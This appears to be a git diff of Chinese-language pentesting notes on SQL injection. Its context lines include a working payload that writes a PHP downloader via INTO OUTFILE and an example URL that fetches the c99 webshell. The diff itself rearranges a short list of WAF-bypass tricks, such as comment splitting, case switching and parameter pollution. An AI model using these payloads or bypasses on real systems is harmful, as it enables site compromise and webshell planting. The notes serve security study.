@@ -61,7 +61,13 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
     * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
     * ...
 
-#### WAFbypass
+#### SQLi - WAFbypass
+
+* 绕过方法
+  * sqlmap tamper - 用注释分割关键字 `/**/` 等
+  * HTTP参数污染(HTTP Parameter Pollution)
+  * ...
+
 
 利用SQL注入写入webshell被拦截 - 如何绕过黑名单字符`'` `<` `?`
 
@@ -142,13 +148,6 @@ test.get_columns_len() #获取字段名长度
 test.get_columns() #获取字段名
 test.get_content() #获取第一列第一个字段内容
 ```
-
-#### SQLi - BypassWAF
-
-* 大小写转换 `SeLecT`
-* 用注释分割关键字 `/**/`
-* HTTP参数污染(HTTP Parameter Pollution)
-* ...
 
 #### 常见错误 - 写入文件失败
 
